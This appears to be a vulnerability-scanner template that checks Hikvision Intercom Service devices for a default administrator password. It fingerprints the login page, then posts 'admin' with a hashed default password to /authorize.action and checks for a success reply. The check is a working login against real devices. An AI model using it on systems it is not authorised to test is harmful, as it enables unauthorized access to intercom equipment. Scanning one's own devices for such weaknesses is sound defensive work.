id: poc-yaml-hikvision-intercom-service-default-password
info:
  name: Hikvision Intercom Service 默认密码漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: HIKVISION
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "document.title = LOGIN_BTN_LOGIN")
  output: []
- method: POST
  path: /authorize.action
  headers: {}
  data: username=admin&userpsw=827ccb0eea8a706c4c34a16891f84e7b&language=zh_cn
  redirect: false
  raw: null
  timeout: null
  expression: 'status_code == 200 && contains(body, "{\"success\": true, \"msg\":
    \"OK\"}")'
  output: []
